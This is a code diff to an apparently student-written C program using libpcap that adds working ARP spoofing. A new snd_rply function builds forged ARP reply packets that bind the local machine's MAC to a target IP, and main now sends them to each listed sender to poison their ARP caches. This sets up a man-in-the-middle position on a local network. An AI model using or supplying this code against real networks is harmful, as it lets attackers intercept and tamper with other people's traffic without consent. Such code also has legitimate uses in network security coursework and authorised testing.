@@ -39,7 +39,7 @@ void get_mymac(char* my_mac, char* iface){
     for(int i=0; i<6; i++) my_mac[i] = mac[i];
 }
 
-bool check_arp_reply(const u_char* packet, uint8_t* mymac){
+bool chck_arp_reply(const u_char* packet, uint8_t* mymac){
     struct arp_pckt arp_p;
     int type;
 
@@ -68,7 +68,7 @@ void get_mac(pcap_t* handle, uint8_t* snd_mac, uint8_t* tgt_mac, uint8_t* tgt_ip
     arp_p.arp.pr_len = '\x04';
     memcpy(arp_p.arp.opcode, "\x00\x01", 2);
     memcpy(arp_p.arp.snd_mac, snd_mac, 6);
-    memcpy(arp_p.arp.snd_ip, "\xde\xad\xbe\xef", 4);
+    memcpy(arp_p.arp.snd_ip, "\xab\xcd\xef\x12", 4);
     memcpy(arp_p.arp.tgt_mac, "\x00\x00\x00\x00\x00\x00", 6);
     memcpy(arp_p.arp.tgt_ip, tgt_ip, 4);
 
@@ -85,7 +85,7 @@ void get_mac(pcap_t* handle, uint8_t* snd_mac, uint8_t* tgt_mac, uint8_t* tgt_ip
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
         printf("%u bytes captured\n", header->caplen);
-        if(check_arp_reply(packet, snd_mac)){
+        if(chck_arp_reply(packet, snd_mac)){
             extract_mac(packet, tgt_mac);
             break;
         }
@@ -97,6 +97,27 @@ void get_mac(pcap_t* handle, uint8_t* snd_mac, uint8_t* tgt_mac, uint8_t* tgt_ip
 void print_mac(uint8_t* mac){
     printf("MAC Address : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 }
+
+void snd_rply (pcap_t* handle, uint8_t* snd_mac, uint8_t* snd_ip, uint8_t* tgt_mac, uint8_t* tgt_ip){
+    struct arp_pckt arp_p;
+
+
+    memcpy(arp_p.eth.dst_mac, tgt_mac, 6);
+    memcpy(arp_p.eth.src_mac, snd_mac, 6);
+    memcpy(arp_p.eth.type, "\x08\x06", 2);
+    memcpy(arp_p.arp.hd_type, "\x00\x01", 2);
+    memcpy(arp_p.arp.pr_type, "\x08\x00", 2);
+    arp_p.arp.hd_len = '\x06';
+    arp_p.arp.pr_len = '\x04';
+    memcpy(arp_p.arp.opcode, "\x00\x02", 2);
+    memcpy(arp_p.arp.snd_mac, snd_mac, 6);
+    memcpy(arp_p.arp.snd_ip, snd_ip, 4);
+    memcpy(arp_p.arp.tgt_mac, tgt_mac, 6);
+    memcpy(arp_p.arp.tgt_ip, tgt_ip, 4);
+
+    pcap_sendpacket(handle, (const u_char*)&arp_p, 60);
+}
+
 
 int main(int argc, char* argv[]) {
 
@@ -111,7 +132,7 @@ int main(int argc, char* argv[]) {
     if( (argc-2)%2 != 0){
         printf("==================================================\n");
         printf("Check that session arguments exists. ex) sender_ip or target_ip \n");
-        printf("./[program name] [dev] [sender_ip] [target_ip]\n");
+        printf("./[program name] [dev] [sender_ip] [target_ip] ... [sender_ip] [target_ip]\n");
         return -1;
     }
 
@@ -144,7 +165,7 @@ int main(int argc, char* argv[]) {
             print_mac(sess_s[i].tgt_mac);
         }
 
-
+    for (int i=0; i<sess_num; i++) snd_rply(handle, my_mac, sess_s[i].tgt_ip, sess_s[i].snd_mac, sess_s[i].snd_ip);
 
 
   while (true) {
